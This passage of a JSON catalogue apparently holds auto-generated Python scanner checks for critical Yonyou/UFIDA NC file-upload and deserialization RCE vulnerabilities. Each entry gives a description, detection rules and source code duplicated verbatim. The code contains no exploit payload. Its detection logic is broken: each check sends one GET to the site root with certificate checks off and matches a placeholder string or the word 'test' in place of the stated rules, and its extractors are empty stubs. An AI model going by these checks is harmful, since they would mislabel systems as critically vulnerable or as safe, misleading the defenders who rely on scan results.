        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-dispatcher-fileupload\nName: Yonyou NC ServiceDispatcher Servlet - Arbitrary File Upload\nSeverity: critical\nDescription: Yonyou NC ServiceDispatcherServlet deserialization file upload vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_dispatcher_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-dispatcher-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou NC ServiceDispatcher Servlet - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'just_a_test')\"\n\n        # Simple word matcher simulation\n        matchers = ['just_a_test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou NC ServiceDispatcher Servlet - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_dispatcher_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-dispatcher-fileupload\nName: Yonyou NC ServiceDispatcher Servlet - Arbitrary File Upload\nSeverity: critical\nDescription: Yonyou NC ServiceDispatcherServlet deserialization file upload vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_dispatcher_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-dispatcher-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou NC ServiceDispatcher Servlet - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'just_a_test')\"\n\n        # Simple word matcher simulation\n        matchers = ['just_a_test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou NC ServiceDispatcher Servlet - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_dispatcher_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "intrusive",
          "fileupload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_nc_grouptemplet_fileupload",
        "name": "UFIDA NC Grouptemplet Interface - Unauthenticated File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "The UFIDA NC Grouptemplet Interface permits unauthenticated users to upload potentially malicious files.",
        "severity": "critical",
        "detection": "[AND] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'{{randstr_2}}')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "v1",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: v1",
            "default": "{{rand_int(1,100)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-grouptemplet-fileupload\nName: UFIDA NC Grouptemplet Interface - Unauthenticated File Upload\nSeverity: critical\nDescription: The UFIDA NC Grouptemplet Interface permits unauthenticated users to upload potentially malicious files.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_grouptemplet_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-grouptemplet-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA NC Grouptemplet Interface - Unauthenticated File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'{{randstr_2}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr_2}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA NC Grouptemplet Interface - Unauthenticated File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_grouptemplet_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-grouptemplet-fileupload\nName: UFIDA NC Grouptemplet Interface - Unauthenticated File Upload\nSeverity: critical\nDescription: The UFIDA NC Grouptemplet Interface permits unauthenticated users to upload potentially malicious files.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_grouptemplet_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-grouptemplet-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA NC Grouptemplet Interface - Unauthenticated File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'{{randstr_2}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr_2}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA NC Grouptemplet Interface - Unauthenticated File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_grouptemplet_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "intrusive",
          "ufida",
          "fileupload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_nc_ncmessageservlet_rce",
        "name": "UFIDA NC NCMessageServlet - Deserialization RCE Detection",
        "language": "Python",
        "famille": "WebApp",
        "description": "UFIDA NC is in the process of processing client request data. Insufficient checking and filtering when deserializing user-supplied data can lead to malicious deserialization operations and execution of commands on the operating system. After analysis, security researchers found that the system has many exploit points for deserialization. Currently, the official vulnerability fix plan is to perform deserialization whitelist control on known exploit points and repair some exploit chain dependencies. The possibility of similar problems occurring in the system in the future is still high.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200 && contains(header_1,\"X-T0ken\") && contains(header_1,\"MTc5Njc2NTUwNg==\"); status_code_2 == 200 && contains(header_2,\"X-T0ken\") && contains(header_2,\"MTc5Njc2NTUwNQ==\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-ncmessageservlet-rce\nName: UFIDA NC NCMessageServlet - Deserialization RCE Detection\nSeverity: critical\nDescription: UFIDA NC is in the process of processing client request data. Insufficient checking and filtering when deserializing user-supplied data can lead to malicious deserialization operations and execution of commands on the operating system. After analysis, security researchers found that the system has many exploit points for deserialization. Currently, the official vulnerability fix plan is to perform deserialization whitelist control on known exploit points and repair some exploit chain dependencies. The possibility of similar problems occurring in the system in the future is still high.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_ncmessageservlet_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-ncmessageservlet-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA NC NCMessageServlet - Deserialization RCE Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && contains(header_1,\"X-T0ken\") && contains(header_1,\"MTc5Njc2NTUwNg==\"); status_code_2 == 200 && contains(header_2,\"X-T0ken\") && contains(header_2,\"MTc5Njc2NTUwNQ==\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA NC NCMessageServlet - Deserialization RCE Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_ncmessageservlet_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
